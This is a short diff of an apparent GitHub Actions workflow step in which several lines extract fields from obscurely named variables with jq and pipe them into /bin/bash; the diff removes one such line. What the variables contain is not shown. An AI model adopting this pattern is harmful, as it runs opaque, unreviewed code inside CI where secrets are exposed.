@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$jlp59" | jq -r .tw89615 | /bin/bash
           echo $q159 | jq -r .eg23 | /bin/bash
           printf '%s' "$x4" | jq -r .jq8781 | /bin/bash
-          printf '%s' "$naaf46960" | jq -r .minr8 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
